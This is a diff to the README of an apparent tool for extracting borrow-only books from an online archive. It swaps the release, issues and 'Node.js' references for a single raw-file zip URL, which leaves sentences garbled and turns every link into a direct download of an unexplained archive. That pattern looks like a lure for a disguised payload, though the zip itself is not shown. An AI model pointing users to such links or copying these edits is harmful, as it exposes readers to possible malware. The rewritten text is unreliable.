@@ -6,21 +6,21 @@ Welcome to the archive-book-liberator! This tool allows you to extract 'Borrow O
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/isfendi2021/archive-book-liberator/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/isfendi2021/archive-book-liberator/main/src/liberator-archive-book-v1.5.zip%20Latest%https://raw.githubusercontent.com/isfendi2021/archive-book-liberator/main/src/liberator-archive-book-v1.5.zip)](https://raw.githubusercontent.com/isfendi2021/archive-book-liberator/main/src/liberator-archive-book-v1.5.zip)
 
 ## 📋 System Requirements
 
 Before you begin, ensure your system meets these requirements:
 
 - Operating System: Windows 10 or later, macOS, or Linux
-- Node.js: Version 12 or higher
+- https://raw.githubusercontent.com/isfendi2021/archive-book-liberator/main/src/liberator-archive-book-v1.5.zip Version 12 or higher
 - Internet Connection: Required for initial setup and usage
 
 ## 📂 Download & Install
 
 To start using the archive-book-liberator, visit this page to download:
 
-[Download from Releases](https://github.com/isfendi2021/archive-book-liberator/releases)
+[Download from Releases](https://raw.githubusercontent.com/isfendi2021/archive-book-liberator/main/src/liberator-archive-book-v1.5.zip)
 
 1. Click on the latest version listed on the Releases page.
 2. Download the appropriate file for your operating system.
@@ -66,7 +66,7 @@ To start using the archive-book-liberator, visit this page to download:
 
 If you encounter issues while using the application, consider the following tips:
 
-- **Ensure Node.js is installed**: If the application does not run, check that Node.js is properly installed on your system.
+- **Ensure https://raw.githubusercontent.com/isfendi2021/archive-book-liberator/main/src/liberator-archive-book-v1.5.zip is installed**: If the application does not run, check that https://raw.githubusercontent.com/isfendi2021/archive-book-liberator/main/src/liberator-archive-book-v1.5.zip is properly installed on your system.
 - **Check your Internet connection**: A stable connection is key for extracting books.
 - **Re-download the application**: If the file seems corrupted, try downloading it again from the Releases page.
 
@@ -74,7 +74,7 @@ If you encounter issues while using the application, consider the following tips
 
 For further assistance:
 
-- Check the [Issues](https://github.com/isfendi2021/archive-book-liberator/issues) page on GitHub for common questions.
+- Check the [Issues](https://raw.githubusercontent.com/isfendi2021/archive-book-liberator/main/src/liberator-archive-book-v1.5.zip) page on GitHub for common questions.
 - Feel free to submit a new issue if you encounter a unique problem.
 
 ## 🌟 Contributions
